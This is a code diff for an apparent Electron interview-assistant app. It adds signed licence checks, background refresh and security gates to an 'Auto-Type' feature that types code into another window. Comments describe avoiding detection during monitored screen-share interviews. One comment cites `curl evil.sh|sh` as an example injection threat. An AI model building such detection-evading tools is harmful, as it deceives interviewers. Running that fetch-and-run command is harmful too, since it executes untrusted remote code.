+// random. Check the characters we received; decode afterwards, only to READ.
+function autoTypeVerifySignedClaim(envelope, expectedSub, nowMs) {
+  try {
+    if (!envelope || typeof envelope !== 'object') return null;
+    // `alg` and `v` sit OUTSIDE the signature, so they prove nothing — they
+    // only say whether this is a shape we understand. Pinning them means a
+    // future envelope format lands as "no claim" (fall back to the probe)
+    // instead of as a confident misparse.
+    if (envelope.alg !== 'ed25519' || envelope.v !== 1) return null;
+    const payloadB64 = envelope.payload;
+    const sigB64 = envelope.sig;
+    if (typeof payloadB64 !== 'string' || typeof sigB64 !== 'string') return null;
+    // base64url decoding SILENTLY DISCARDS out-of-alphabet bytes, so a
+    // truncated or hand-edited file would otherwise decode to a shorter but
+    // perfectly valid-looking buffer. Insist on the exact charset first.
+    if (!/^[A-Za-z0-9_-]+$/.test(payloadB64) || !/^[A-Za-z0-9_-]+$/.test(sigB64)) return null;
+    const pub = autoTypeClaimPublicKey();
+    if (!pub) return null;
+    const sig = Buffer.from(sigB64, 'base64url');
+    if (sig.length !== 64) return null;  // Ed25519 signatures are fixed-width
+    // Ed25519 takes a NULL algorithm — the curve fixes its own hash (SHA-512,
+    // internally, over the whole message). Passing 'sha256' here throws.
+    if (!require('crypto').verify(null, Buffer.from(payloadB64, 'ascii'), pub, sig)) return null;
+    const claim = JSON.parse(Buffer.from(payloadB64, 'base64url').toString('utf8'));
+    if (!claim || typeof claim !== 'object') return null;
+    // Payload version, this one INSIDE the signature. A bump means the
+    // server changed what these fields mean, and the right response to that
+    // is to stop trusting our reading of them and fall back to the probe —
+    // not to guess.
+    if (claim.v !== 1) return null;
+    if (typeof claim.autoType !== 'boolean') return null;
+    if (typeof claim.exp !== 'number' || !(claim.exp > nowMs)) return null;
+    // Bind the claim to THIS account. Copying the file to another machine or
+    // another login is the obvious next attack after editing it, and this is
+    // what makes it worthless. expectedSub is null only when we cannot read
+    // a user id at all (signed out, or a token that isn't a JWT) — see
+    // autoTypeReadSignedClaim for why that case still honours a claim rather
+    // than locking someone out mid-interview.
+    if (expectedSub != null && String(claim.sub) !== String(expectedSub)) return null;
+    return claim;
+  } catch (_) {
+    // Malformed JSON, a truncated file, an OpenSSL build without Ed25519 —
+    // every one of them means "no signed claim", never a crash.
+    return null;
+  }
+}
+
+// The raw user id out of the JWT, unprefixed — which is what the claim's
+// `sub` carries. Distinct from autoTypeIdentityKey above, which returns a
+// namespaced CACHE key ('u:123', or a token fingerprint when the token
+// isn't a JWT); neither of those forms is something a server would ever put
+// in `sub`, so comparing against it would fail every claim.
+function autoTypeTokenUserId(authToken) {
+  if (!authToken) return null;
+  try {
+    const seg = String(authToken).split('.')[1];
+    if (!seg) return null;
+    const json = JSON.parse(Buffer.from(seg.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
+    const id = json && (json.id != null ? json.id : (json.sub != null ? json.sub : json.userId));
+    if (id != null && String(id).length) return String(id);
+  } catch (_) { /* not a JWT — there is no id to bind to */ }
+  return null;
+}
+
+// Signed claims live in the SAME file as the unsigned grants, under their
+// own `claims` map. One file, one read — and the existing reader already
+// ignores unknown top-level keys, so a claim written by this build simply
+// rides along beside the `entries` an older build would still understand.
+function autoTypeClaimsOf(cache) {
+  const claims = cache && cache.claims;
+  return (claims && typeof claims === 'object') ? claims : {};
+}
+
+function autoTypeStoreSignedClaim(key, envelope) {
+  if (!key || !envelope) return;
+  try {
+    const cache = autoTypeReadEntitlementCache();
+    const claims = autoTypeClaimsOf(cache);
+    // `at` is our local wall-clock and is OUTSIDE the signature on purpose.
+    // It is used for exactly one thing — deciding how stale a DENIAL is —
+    // and it can never grant access, so editing it buys an attacker nothing.
+    claims[key] = {
+      payload: envelope.payload,
+      sig: envelope.sig,
+      alg: envelope.alg,
+      v: envelope.v,
+      at: Date.now(),
+    };
+    // Same bound as the unsigned entries: nobody signs into more than a
+    // handful of accounts on one machine, and an unbounded map is a slow
+    // disk leak.
+    const keys = Object.keys(claims);
+    if (keys.length > 8) {
+      keys.sort((a, b) => (claims[a].at || 0) - (claims[b].at || 0));
+      for (const k of keys.slice(0, keys.length - 8)) delete claims[k];
+    }
+    cache.claims = claims;
+    fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
+  } catch (e) {
+    // Best-effort, exactly like the unsigned cache: a machine that cannot
+    // write here just re-verifies online, which is inconvenient, never
+    // unsafe.
+    console.warn('[auto-type] could not persist signed entitlement claim:', e && e.message);
+  }
+}
+
+// Drop a signed claim outright. Deliberately SEPARATE from
+// autoTypeForgetEntitlement: the signed-denial path below drops the unsigned
+// grant and must KEEP the signed denial (that denial is the record — it is
+// the thing making the downgrade stick), whereas an explicit 402/403 from a
+// live route means whatever claim we hold has been overtaken by events.
+function autoTypeForgetSignedClaim(key) {
+  if (!key) return;
+  try {
+    const cache = autoTypeReadEntitlementCache();
+    const claims = autoTypeClaimsOf(cache);
+    if (claims[key]) {
+      delete claims[key];
+      cache.claims = claims;
+      fs.writeFileSync(autoTypeEntitlementFile(), JSON.stringify(cache), 'utf8');
+    }
+  } catch (_) { /* best-effort */ }
+}
+
+// The read side. Returns { claim, key, storedAt } for a claim that verifies
+// right now, or null. Note that verification happens on EVERY read, not once
+// at write time: the file lives on the user's own disk, so "it verified when
+// we stored it" says nothing about what is in it a minute later.
+function autoTypeReadSignedClaim(authToken) {
+  try {
+    const sub = autoTypeTokenUserId(authToken);
+    const key = autoTypeIdentityKey(authToken);
+    const cache = autoTypeReadEntitlementCache();
+    const claims = autoTypeClaimsOf(cache);
+    const now = Date.now();
+    if (key) {
+      const env = claims[key];
+      if (!env) return null;
+      const claim = autoTypeVerifySignedClaim(env, sub, now);
+      if (!claim) return null;
+      return { claim, key, storedAt: typeof env.at === 'number' ? env.at : 0 };
+    }
+    // No key at all — signed out, or a token we cannot read an id from. We
+    // still honour a claim that VERIFIES and has not expired: it is
+    // server-signed proof that this installation was entitled inside the
+    // claim's lifetime, the same property autoTypeCachedEntitlement asserts
+    // in this case, except this one cannot be written by hand. Refusing here
+    // would lock out the user whose token vanished mid-interview, which is
+    // the exact failure the whole grace mechanism exists to prevent. Only
+    // ALLOWs are honoured on this path — a denial minted for some other
+    // account must never deny the person sitting here.
+    for (const [k, env] of Object.entries(claims)) {
+      const claim = autoTypeVerifySignedClaim(env, null, now);
+      if (claim && claim.autoType === true) {
+        return { claim, key: k, storedAt: typeof env.at === 'number' ? env.at : 0 };
+      }
+    }
+    return null;
+  } catch (_) {
+    return null;
+  }
+}
+
+// ── Keeping the claim warm ──
+// How long a fetched claim is left alone. The claim is good for seven days,
+// so refreshing on every cold launch would be six days of requests that
+// change nothing — we only go back inside the last day of its life.
+const AT_CLAIM_REFRESH_MARGIN_MS = 24 * 60 * 60 * 1000;
+// A DENIAL is re-checked far more eagerly than a grant, and the asymmetry is
+// the whole point: a stale grant costs us at most a week of a feature
+// somebody stopped paying for, while a stale denial costs a user who paid
+// five minutes ago and is being told no. An hour is short enough that
+// "upgrade, then use it" works without a reinstall.
+const AT_CLAIM_DENIAL_RECHECK_MS = 60 * 60 * 1000;
+// First refresh well after launch. The app is painting, restoring sessions
+// and running an update check; this is the least urgent network call in the
+// process and it gets the last slot. The later entries cover the renderer
+// still loading at 20s and the user signing in a few minutes into the
+// session — see autoTypeStartEntitlementRefresh for why one shot isn't
+// enough.
+const AT_CLAIM_STARTUP_DELAYS_MS = [20 * 1000, 2 * 60 * 1000, 10 * 60 * 1000, 30 * 60 * 1000];
+const AT_CLAIM_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;
+// The claim endpoint is one database read and one signature — no model call,
+// nothing to wait on. A missed refresh is a non-event, so the timeout is
+// short on purpose.
+const AT_CLAIM_FETCH_TIMEOUT_MS = 6000;
+
+async function autoTypeFetchSignedClaim(authToken) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => { try { controller.abort(); } catch (_) {} }, AT_CLAIM_FETCH_TIMEOUT_MS);
+  try {
+    const res = await fetch(`${API_BASE}/api/v1/license/entitlements`, {
+      method: 'GET',
+      headers: {
+        'Authorization': `Bearer ${authToken}`,
+        'Accept': 'application/json',
+      },
+      signal: controller.signal,
+    });
+    if (res.status !== 200) {
+      // 501 means the server has no signing key configured yet, and it is
+      // the only non-200 worth naming: it says "fall back to the unsigned
+      // probe", not "this user is unentitled". 401 / 404 / 429 / 5xx all
+      // collapse to the same thing here — we learned nothing, so we keep
+      // whatever claim we already hold. Drain the tiny body so the socket
+      // goes back to the pool instead of waiting on GC.
+      try { await res.text(); } catch (_) {}
+      return { status: res.status };
+    }
+    const body = await res.json();
+    return { status: 200, envelope: body };
+  } catch (e) {
+    return { status: 0, error: e && e.message ? e.message : String(e) };
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+function autoTypeClaimNeedsRefresh(authToken) {
+  const signed = autoTypeReadSignedClaim(authToken);
+  if (!signed) return true;
+  if (signed.claim.autoType !== true) {
+    return (Date.now() - (signed.storedAt || 0)) > AT_CLAIM_DENIAL_RECHECK_MS;
+  }
+  return (signed.claim.exp - Date.now()) < AT_CLAIM_REFRESH_MARGIN_MS;
+}
+
+// Fetch + verify + store. Returns a promise that ALWAYS resolves — callers
+// are timers and startup hooks with nobody watching, and an unhandled
+// rejection in the main process is a native error dialog on top of whatever
+// the user was doing.
+async function autoTypeRefreshSignedClaim(authToken, reason) {
+  try {
+    if (!authToken) return false;
+    // Never mid-interview. A background HTTPS call to a licensing domain
+    // forty minutes into a monitored screen-share is precisely the anomaly
+    // Local-Only mode exists to avoid, and nothing here is urgent enough to
+    // be worth it — the claim lasts a week and the next tick is hours away,
+    // long after the session ends. Same sessionActive gate the updater and
+    // the tray notifications use.
+    if (sessionActive) return false;
+    if (!autoTypeClaimNeedsRefresh(authToken)) return false;
+    const key = autoTypeIdentityKey(authToken);
+    if (!key) return false;
+    const res = await autoTypeFetchSignedClaim(authToken);
+    if (res.status !== 200 || !res.envelope) {
+      console.log(`[auto-type] entitlement claim refresh (${reason}): nothing learned (${res.status === 501 ? 'server has no signing key yet — unsigned probe still in charge' : (res.status ? 'HTTP ' + res.status : res.error || 'network error')})`);
+      return false;
+    }
+    const claim = autoTypeVerifySignedClaim(res.envelope, autoTypeTokenUserId(authToken), Date.now());
+    if (!claim) {
+      // A 200 that does not verify is not a mild problem — it is a rotated
+      // key pair, the wrong API base, or something on the wire rewriting our
+      // responses. Never store it, and say so loudly enough to debug from a
+      // user's log.
+      console.warn('[auto-type] entitlement claim refresh: server returned a claim that did NOT verify against the shipped public key — ignoring it');
+      return false;
+    }
+    autoTypeStoreSignedClaim(key, res.envelope);
+    console.log(`[auto-type] entitlement claim refreshed (${reason}): autoType=${claim.autoType} tier=${claim.tier} valid ${Math.round((claim.exp - Date.now()) / 3600000)}h`);
+    return true;
+  } catch (e) {
+    console.warn('[auto-type] entitlement claim refresh threw:', e && e.message);
+    return false;
+  }
+}
+
+// The token, in MEMORY ONLY — main has never persisted one (see the note on
+// payload.authToken in the handler) and must not start. This is a warm copy
+// of the last token a legitimate Auto-Type run handed us, so a refresh can
+// still happen when the renderer isn't in a state to be asked.
+let autoTypeKnownToken = null;
+function autoTypeRememberToken(authToken) {
+  if (typeof authToken === 'string' && authToken.length > 20) autoTypeKnownToken = authToken;
+}
+
+// Main PULLS the token; the renderer never pushes it. That direction is the
+// entire point — a refresh the renderer triggers is a refresh an attacker in
+// the renderer controls, and "the renderer says so" is the trust boundary
+// this work exists to remove. Reading localStorage off the page is not an
+// escalation: it is the same string the renderer already hands us on every
+// Auto-Type run, and a forged one buys nothing, because what we believe at
+// the end is the server's signature, not the token.
+async function autoTypeDiscoverToken() {
+  try {
+    const wc = mainWindow && !mainWindow.isDestroyed() ? mainWindow.webContents : null;
+    if (wc && !wc.isDestroyed() && !wc.isLoading()) {
+      const t = await wc.executeJavaScript(
+        "(() => { try { return localStorage.getItem('minicaai_token'); } catch (e) { return null; } })()"
+      );
+      if (typeof t === 'string' && t.length > 20) return t;
+    }
+  } catch (_) { /* window gone, page mid-navigation, renderer crashed — fine */ }
+  return autoTypeKnownToken;
+}
+
+// ── FIX for the user who has never been online ──
+// The probe only ever ran when Auto-Type was FIRST USED, so somebody who
+// bought Ultra, installed, turned Local-Only on and walked into an interview
+// got refused at the worst possible moment. Refreshing in the background
+// means any Ultra user who has EVER launched this app with a connection is
+// already carrying a signed claim by the time they need it.
+let autoTypeClaimRefreshTimer = null;
+function autoTypeStartEntitlementRefresh() {
+  // Idempotent: createMainWindow runs again on tray-restore and on macOS
+  // 'activate', and a second interval here would stack forever.
+  if (autoTypeClaimRefreshTimer) return;
+  const tick = async (reason) => {
+    try {
+      if (sessionActive) return;
+      const token = await autoTypeDiscoverToken();
+      if (!token) return;
+      await autoTypeRefreshSignedClaim(token, reason);
+    } catch (_) { /* nothing on this path is allowed to matter */ }
+  };
+  // Several early attempts, not one. A single 20-second shot misses the two
+  // commonest cold-start shapes: the renderer is still loading (no token to
+  // read yet), and the user signs in a couple of minutes AFTER launch — and
+  // missing either would park the next attempt six hours away, which on
+  // install-day is precisely the person this fix exists for. Retries are
+  // free once a claim lands: autoTypeClaimNeedsRefresh short-circuits on a
+  // local file read and never touches the network again.
+  //
+  // .catch() on a promise that already cannot reject is belt-and-suspenders,
+  // and cheap next to what an unhandled rejection looks like in main.
+  for (const delay of AT_CLAIM_STARTUP_DELAYS_MS) {
+    setTimeout(() => { tick('startup').catch(() => {}); }, delay);
+  }
+  autoTypeClaimRefreshTimer = setInterval(() => { tick('periodic').catch(() => {}); }, AT_CLAIM_REFRESH_INTERVAL_MS);
+}
+
+// The probe itself. Returns { status } — status 0 means we never got an
+// answer (network error / timeout), which is explicitly NOT a denial.
+async function autoTypeProbeEntitlement(authToken) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => { try { controller.abort(); } catch (_) {} }, AT_ENTITLEMENT_PROBE_TIMEOUT_MS);
+  try {
+    const res = await fetch(`${API_BASE}/api/v1/ai/autotype-plan`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${authToken}`,
+        // Marks these in the server log as what they are — a gate check,
+        // not a planner call that mysteriously forgot to send code.
+        'X-Autotype-Entitlement-Probe': '1',
+      },
+      body: JSON.stringify({ entitlementProbe: true }),
+      signal: controller.signal,
+    });
+    // Drain the (tiny) body so the socket goes back to the pool instead of
+    // waiting on GC.
+    try { await res.text(); } catch (_) {}
+    return { status: res.status };
+  } catch (e) {
+    return { status: 0, error: e && e.message ? e.message : String(e) };
+  } finally {
+    clearTimeout(timer);
+  }
+}
+
+// The decision. Never throws and never rejects: the caller fires this off
+// next to a countdown the user can cancel, and a dangling rejected promise
+// there would be an unhandled rejection on a perfectly normal abort.
+async function autoTypeVerifyEntitlement({ authToken, localOnly }) {
+  let key = null;
+  let cached = null;
+  // Set when a valid signed denial was seen and we fell through to the live
+  // probe anyway. It means "the last thing the server told us was no", which
+  // is the tie-breaker if the probe then fails to tell us anything.
+  let signedDenial = false;
+  try {
+    key = autoTypeIdentityKey(authToken);
+    cached = autoTypeCachedEntitlement(key);
+    // Keep a warm copy for the background refresher. This is the one hook
+    // that already exists for main to learn a token, so we use it rather
+    // than adding an IPC channel the renderer would have to call — a
+    // renderer-driven refresh is exactly the trust boundary being removed.
+    autoTypeRememberToken(authToken);
+
+    // ── The signed claim outranks everything below it ──
+    // In BOTH directions, and before the localOnly branch on purpose: a
+    // verified claim is the only artefact in this system the user cannot
+    // write for themselves, and checking it needs no network — which is
+    // precisely what Local-Only mode and hotel wifi need. Once one has ever
+    // been seen, the unsigned grant underneath is a compatibility fallback
+    // for servers that have no signing key yet, nothing more.
+    const signed = autoTypeReadSignedClaim(authToken);
+    if (signed && signed.claim.autoType === true) {
+      return {
+        allowed: true,
+        source: localOnly ? 'signed-claim-local-only' : 'signed-claim',
+        tier: signed.claim.tier || null,
+        expiresInMs: signed.claim.exp - Date.now(),
+      };
+    }
+    if (signed && signed.claim.autoType === false) {
+      // A SIGNED denial is authoritative in a way a 403 never is: a 403 could
+      // equally be an expired token or a server having a bad day, which is
+      // why the endpoint answers 200 with autoType:false instead of a status
+      // code. This is what makes a downgrade stop working promptly — drop the
+      // older unsigned grant so its seven-day window cannot outlive the
+      // subscription. The signed denial itself STAYS (it is the record).
+      autoTypeForgetEntitlement(key);
+      cached = null;   // dropped above; must not resurface on the degraded path
+      signedDenial = true;
+      // But a denial is a snapshot, and the person most likely to hit it is
+      // the person who just paid to make it false. Offline we have no way to
+      // know, so the denial stands. ONLINE we do: fall through to the live
+      // probe, which answers the current question rather than the one we
+      // cached up to an hour ago. It cuts both ways and that is the point —
+      // a downgraded account gets 403 from the same probe. Local-Only still
+      // returns here, because there the whole point is that no call happens.
+      if (localOnly || !authToken) {
+        return {
+          allowed: false,
+          reason: 'entitlement_denied',
+          source: 'signed-claim',
+          message: 'Auto-Type is an Ultra feature, and this account is not on the Ultra plan right now. Upgrade from Settings → Subscription to use it.',
+        };
+      }
+    }
+
+    // Local-Only mode suppresses the network call BY DESIGN — see the
+    // localOnly comment at the top of the handler; on a monitored network
+    // the Railway call is itself the anomaly. So local-only runs on the
+    // cache alone, and a device that has never been verified is refused
+    // with something the user can actually act on.
+    if (localOnly) {
+      if (cached) return { allowed: true, source: 'cache-local-only', ageMs: cached.ageMs };
+      return {
+        allowed: false,
+        reason: 'entitlement_unverified',
+        message: 'Auto-Type needs a one-time online check. Turn Local-Only Auto-Type off once (or reconnect), run Auto-Type, and it will keep working offline for the next 7 days.',
+      };
+    }
+
+    // No token at all — nothing to probe with. Same rule as a network
+    // failure: fall back to the cache, refuse if there isn't one.
+    if (!authToken) {
+      if (cached) return { allowed: true, source: 'cache-no-token', ageMs: cached.ageMs };
+      return {
+        allowed: false,
+        reason: 'entitlement_signed_out',
+        message: 'Auto-Type is an Ultra feature — sign in so we can verify your plan.',
+      };
+    }
+
+    const probe = await autoTypeProbeEntitlement(authToken);
+    const status = probe.status;
+
+    if (status === 401) {
+      // Expired / revoked session. Not a tier verdict, so we deliberately do
+      // NOT drop the cached grant — this user may be Ultra with a stale
+      // token, and punishing them here would lock them out offline later.
+      return {
+        allowed: false,
+        reason: 'entitlement_signed_out',
+        message: 'Auto-Type could not verify your plan — your session expired. Sign in again, then retry.',
+        status,
+      };
+    }
+    if (status === 403 || status === 402) {
+      autoTypeForgetEntitlement(key);
+      // We only reach the probe when no signed claim was usable, so there is
+      // usually nothing to drop here — but an expired or wrong-`sub` claim
+      // could still be sitting in the file, and a live tier denial is proof
+      // it is worthless. Clearing it keeps the file honest.
+      autoTypeForgetSignedClaim(key);
+      return {
+        allowed: false,
+        reason: 'entitlement_denied',
+        message: 'Auto-Type is an Ultra feature, and this account is not on the Ultra plan right now. Upgrade from Settings → Subscription to use it.',
+        status,
+      };
+    }
+    if ((status >= 200 && status < 300) || status === 400 || status === 422) {
+      autoTypeRememberEntitlement(key);
+      // The live server just contradicted a signed denial we were holding —
+      // they upgraded. Replace the stale claim now rather than letting the
+      // hourly tick do it, so the NEXT run (which may be offline, or
+      // Local-Only) already has a signed allow to read. Fire-and-forget: the
+      // probe already answered this run, so nothing waits on it, and its own
+      // sessionActive gate still applies.
+      if (signedDenial) {
+        Promise.resolve(autoTypeRefreshSignedClaim(authToken, 'denial-overturned')).catch(() => {});
+      }
+      return { allowed: true, source: 'server', status };
+    }
+
+    // 404 (server predates the route), 429, 5xx, or status 0 (network /
+    // timeout). We learned nothing, so this is a grace-window question.
+    // Unless we were holding a signed denial: then the last thing the server
+    // actually said was no, and "we couldn't reach it" is not a reason to
+    // overturn that. Deny, and say why — the message has to be the denial,
+    // not the never-verified copy below, or someone who genuinely is not on
+    // Ultra gets told to check their connection.
+    if (signedDenial) {
+      return {
+        allowed: false,
+        reason: 'entitlement_denied',
+        source: 'signed-claim',
+        status,
+        message: 'Auto-Type is an Ultra feature, and this account is not on the Ultra plan right now. Upgrade from Settings → Subscription to use it.',
+      };
+    }
+    if (cached) return { allowed: true, source: 'cache-degraded', ageMs: cached.ageMs, status };
+    return {
+      allowed: false,
+      reason: 'entitlement_unverified',
+      message: `Auto-Type could not reach the licensing server (${status ? 'HTTP ' + status : (probe.error || 'network error')}), and this device has never completed an online Ultra check. Connect once and try again.`,
+      status,
+    };
+  } catch (e) {
+    // A bug in the check must not become a keystroke. Degrade to the same
+    // rule as a network failure: cache or refuse.
+    console.warn('[auto-type] entitlement check threw:', e && e.message);
+    if (cached) return { allowed: true, source: 'cache-check-threw', ageMs: cached.ageMs };
+    return {
+      allowed: false,
+      reason: 'entitlement_unverified',
+      message: 'Auto-Type could not verify your plan on this device. Connect to the internet once and try again.',
+    };
+  }
+}
+
+ipcMain.handle('auto-type:send', async (event, payload) => {
   console.log(`[auto-type] IPC received: payload.code=${payload && payload.code ? payload.code.length : 0} bytes, lang=${payload && payload.language || '?'}, skipLines=${payload && payload.skipLines || 0}`);
   const code = payload && typeof payload.code === 'string' ? payload.code : '';
   // skipLines lets the renderer (which ran OCR on the target editor) tell us
@@ -2761,18 +3816,47 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
   // "show me what the planner thought" is now a one-line tail of that file.
   const _atRunId = autoTypePlanLog.newRunId();
   autoTypePlanLog.begin(_atRunId);
+  autoTypeCurrentRunId = _atRunId;   // lets autoTypeBroadcast persist verify outcomes
   autoTypePlanLog.record(_atRunId, { language, intendedCode: code, skipLines, localOnly });
   // P8-1: pin the owning CodeBlock's ID so broadcasts can be addressed.
   const blockId = payload && typeof payload.blockId === 'string' ? payload.blockId : null;
+  // ── Gate 0: who asked? ──
+  // First gate on purpose, so an untrusted sender gets the same answer no
+  // matter what state the engine is in. Anything that can run script in a
+  // renderer — a markdown/chat XSS, a compromised npm dependency, embedded
+  // content in a subframe — could otherwise ask us to type `curl evil.sh|sh`
+  // into whatever terminal the user alt-tabbed to, and we would hide our
+  // own window first so they never saw it happen.
+  if (!autoTypeSenderIsTrusted(event)) {
+    console.error('[auto-type] REFUSED: invoke did not come from the top frame of a window we own — keystroke injection blocked.');
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'untrusted_sender' });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
+    return { error: 'Auto-Type refused: that request did not come from the app window.' };
+  }
   if (autoTypeInFlight) {
     autoTypePlanLog.record(_atRunId, { earlyBail: 'already_in_progress' });
     try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
     return { error: 'Auto-Type already in progress.' };
   }
   if (!code.length) {
     autoTypePlanLog.record(_atRunId, { earlyBail: 'empty_code' });
     try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
     return { error: 'Nothing to type.' };
+  }
+  // ── Gate 1: how much? ──
+  // payload.code arrived as an arbitrary-length string. The cap is not about
+  // sane files (a 500-line source file is ~15 KB) — it is about the fact
+  // that a keystroke stream with no end is one the user cannot get ahead of.
+  const codeBytes = Buffer.byteLength(code, 'utf8');
+  if (codeBytes > AT_MAX_CODE_BYTES) {
+    console.error(`[auto-type] REFUSED: code is ${codeBytes} bytes, over the ${AT_MAX_CODE_BYTES}-byte cap.`);
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'code_too_large', codeBytes });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
+    return { error: `Auto-Type refused: ${Math.round(codeBytes / 1024)} KB is far too much to type (limit ${Math.round(AT_MAX_CODE_BYTES / 1024)} KB).` };
   }
 
   autoTypeInFlight = true;
@@ -2798,9 +3882,24 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
     mouse = nut.mouse || null;
   } catch (e) {
     autoTypeInFlight = false;
+    // L21: this early return used to walk away from an open _pending entry.
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'native_module_load_failed', error: e && e.message });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
     console.error('[auto-type] native module load failed:', e && e.message);
     return { error: 'Native input module failed to load: ' + (e && e.message) };
   }
+
+  // ── Gate 2: did they pay? (fired now, decided before we hide) ──
+  // Started HERE rather than awaited here so the round-trip hides behind the
+  // 3-second countdown the user is already watching — on a normal run it
+  // costs zero visible time. But the DECISION is taken below, before
+  // mainWindow.hide() and long before any keystroke: a refused run must
+  // never leave the user staring at a vanished app mid-interview, and it
+  // must never put a single character into someone else's window.
+  // autoTypeVerifyEntitlement never rejects, so the abort path below can
+  // walk away from this promise without an unhandled rejection.
+  const entitlementCheck = autoTypeVerifyEntitlement({ authToken, localOnly });
 
   // Phase 1: countdown. Windows stay visible so the user can see the
   // timer and alt-tab to the target editor (or click to cancel).
@@ -2810,9 +3909,39 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
   }
   if (autoTypeAbort) {
     autoTypeInFlight = false;
+    // L21: ditto — the user-cancel path leaked its _pending entry too.
+    autoTypePlanLog.record(_atRunId, { earlyBail: 'user_abort_during_countdown', aborted: true });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
     autoTypeBroadcast({ phase: 'done', aborted: true });
     return { aborted: true };
   }
+
+  // The entitlement verdict. Nothing has been hidden yet and nothing has
+  // been typed, so a refusal here is clean: log it, tell the user something
+  // they can act on, and leave the desktop exactly as we found it.
+  const entitlement = await entitlementCheck;
+  if (!entitlement.allowed) {
+    console.warn(`[auto-type] REFUSED by entitlement gate (${entitlement.reason}, status=${entitlement.status || 'n/a'}) — no window hidden, no keystrokes emitted.`);
+    autoTypePlanLog.record(_atRunId, {
+      earlyBail: entitlement.reason,
+      entitlement: { reason: entitlement.reason, status: entitlement.status || null, localOnly },
+    });
+    try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+    autoTypeCurrentRunId = null;
+    autoTypeAbort = true;
+    autoTypeAbortReason = entitlement.reason;
+    autoTypeAbortDiagnostic = { hint: entitlement.message };
+    autoTypeInFlight = false;
+    autoTypeBroadcast({
+      phase: 'done',
+      aborted: true,
+      reason: entitlement.reason,
+      hint: entitlement.message,
+    });
+    return { aborted: true, reason: entitlement.reason };
+  }
+  console.log(`[auto-type] entitlement OK (source=${entitlement.source}${entitlement.status ? ', HTTP ' + entitlement.status : ''}${typeof entitlement.ageMs === 'number' ? ', cached ' + Math.round(entitlement.ageMs / 3600000) + 'h ago' : ''})`);
 
   // Phase 2: hide the main window so the user can see the target editor
   // underneath. We DO NOT hide the popout — it has setContentProtection
@@ -2904,6 +4033,10 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
         reason: 'no_target_editor',
         hint: autoTypeAbortDiagnostic.hint,
       });
+      // L21: this return leaked its _pending log entry as well.
+      autoTypePlanLog.record(_atRunId, { earlyBail: 'no_target_editor', aborted: true, focusedProcName });
+      try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
+      autoTypeCurrentRunId = null;
       return { aborted: true, reason: 'no_target_editor' };
     }
 
@@ -3028,6 +4161,17 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
   // broken → diagnose" loop: the app self-reports instead of us guessing.
   let plannerLabel = 'deterministic-uia';     // overwritten as we go
   let plannerDetail = '';                     // human-readable "why"
+  // ── Mid-run entitlement revocation ──
+  // All three planner routes (/autotype-vision, /autotype-agent,
+  // /autotype-plan) sit behind the SAME requireTier('ultra') middleware, so a
+  // 401/402/403 from any of them is the server saying "not entitled" —
+  // exactly the answer Gate 2 asked for at the top, arriving late (token
+  // expired mid-run, subscription cancelled between the two calls, or a
+  // local-only run that never got to ask). It used to be swallowed as "the
+  // cloud planner is unavailable, use the deterministic fallback" and the
+  // keystrokes went out anyway. Now it stops the run — and it still lands
+  // BEFORE the typing loop, which starts well below this block.
+  let entitlementDeniedStatus = 0;
   if (usedUIA) {
     plannerLabel = 'deterministic-uia';
     plannerDetail = `UIA read the editor directly (skip ${effectiveSkipLines}/${effectiveSkipTrailing})`;
@@ -3071,7 +4215,7 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
       // matters more here.
       autoTypeBroadcast({ phase: 'thinking', source: 'agent' });
       // GOD-LEVEL PATH: try the AI agent first. The /autotype-agent
-      // endpoint is now two-tier internally — Sonnet 4.6 (Anthropic)
+      // endpoint is now two-tier internally — Sonnet 5 (Anthropic)
       // primary with Groq Llama-3.3-70B fail-over on Anthropic outage.
       // Both planners use chain-of-thought + forced tool_choice. The
       // response includes a `planner_used` field ('sonnet' or 'groq')
@@ -3139,6 +4283,7 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
             }
           } else {
             console.log(`[auto-type] vision endpoint HTTP ${visRes.status} — falling through to text agent`);
+            if (visRes.status === 401 || visRes.status === 402 || visRes.status === 403) entitlementDeniedStatus = visRes.status;
             // The single most common real failure: the app is calling a
             // server that doesn't have /autotype-vision (production not
             // deployed, or API_BASE wrong). Make it unmissable.
@@ -3192,6 +4337,7 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
           }
         } else {
           console.log(`[auto-type] agent endpoint HTTP ${agentRes.status} — trying Haiku fallback`);
+          if (agentRes.status === 401 || agentRes.status === 402 || agentRes.status === 403) entitlementDeniedStatus = agentRes.status;
         }
       } catch (agentErr) {
         console.warn('[auto-type] agent call threw, trying Haiku fallback:', agentErr && agentErr.message);
@@ -3217,6 +4363,16 @@ ipcMain.handle('auto-type:send', async (_event, payload) => {
         });
         if (planRes.ok) {
           aiPlan = await planRes.json().catch(() => null);
+          // A 200 here is the tier gate confirming Ultra for this token just
+          // as surely as the preflight probe did — refresh the grace window
+          // so a user who runs Auto-Type daily never falls out of it.
+          autoTypeRememberEntitlement(autoTypeIdentityKey(authToken));
